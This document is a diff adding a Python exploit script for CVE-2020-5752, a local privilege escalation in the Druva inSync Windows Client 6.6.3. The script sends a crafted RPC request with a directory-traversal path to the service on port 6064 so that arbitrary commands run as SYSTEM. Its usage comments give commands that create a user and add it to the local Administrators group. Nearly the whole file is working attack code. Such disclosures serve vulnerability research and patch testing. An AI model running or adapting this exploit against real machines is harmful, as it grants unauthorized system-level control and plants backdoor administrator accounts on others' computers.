@@ -1,0 +1,58 @@
+# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation
+# Date: 2020-05-21
+# Exploit Author: Matteo Malvica
+# Credits: Chris Lyne for previous version's exploit 
+# Vendor Homepage: druva.com
+# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
+# Version: 6.6.3
+# Tested on: Windows 10 1909-18363.778
+# CVE: CVE-2020-5752
+# Command injection in inSyncCPHwnet64 RPC service
+# Runs as nt authority\system. so we have a local privilege escalation
+# The path validation has been only implemented through a 'strncmp' function which can be bypassed by
+# appending a directory traversal escape sequence at the end of the valid path.
+# Writeup: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/ 
+
+# Example usage:
+#python insync.py "windows\system32\cmd.exe /C net user Leon /add"
+#python insync.py "windows\system32\cmd.exe /C net localgroup Administrators Leon /add"
+
+import socket
+import struct
+import sys
+
+if len(sys.argv) < 2:
+    print "Usage: " + __file__ + " <quoted command to execute>"
+    print "E.g. " + __file__ + " \"net user /add tenable\""
+    sys.exit(0)
+
+ip = '127.0.0.1'
+port = 6064
+command_line = 'C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\..\\..\\..\\..\\..\\' + sys.argv[1] 
+
+def make_wide(str):
+    new_str = ''
+    for c in str:
+        new_str += c
+        new_str += '\x00'
+    return new_str
+
+hello = "inSync PHC RPCW[v0002]"
+
+func_num = "\x05\x00\x00\x00"                                   # 05 is to run a command, passed as an agrument to CreateProcessW
+command_line = make_wide(command_line)                          # converts ascii to UTF-8
+command_length = struct.pack('<i', len(command_line))           # packed as little-endian integer
+requests = [ hello, func_num, command_length, command_line ]    # sends each request separately
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((ip, port))
+
+i = 1
+for req in requests:
+    print 'Sending request' + str(i)
+    sock.send(req)
+    i += 1
+
+sock.close()
+
+print "Done."
